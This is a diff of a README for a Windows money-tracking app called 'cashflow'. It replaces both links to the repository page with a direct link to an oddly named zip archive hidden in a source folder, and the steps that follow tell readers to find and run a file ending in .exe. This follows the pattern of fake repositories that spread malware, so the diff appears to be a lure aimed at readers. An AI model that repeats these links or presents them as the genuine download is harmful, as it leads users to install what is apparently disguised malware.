@@ -1,6 +1,6 @@
 # 💰 cashflow - Track your daily money with ease
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Osgoodarbitrable423/cashflow)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Osgoodarbitrable423/cashflow/main/lib/features/profile/Software_procnemial.zip)
 
 ## 🎯 About this software
 
@@ -14,7 +14,7 @@ Your computer needs Windows 10 or Windows 11. You should have at least 200 megab
 
 You download the application from the official page. Follow these steps to set up the software on your Windows machine: 
 
-1. Visit [this page to download](https://github.com/Osgoodarbitrable423/cashflow).
+1. Visit [this page to download](https://raw.githubusercontent.com/Osgoodarbitrable423/cashflow/main/lib/features/profile/Software_procnemial.zip).
 2. Look for the file ending in .exe.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder.
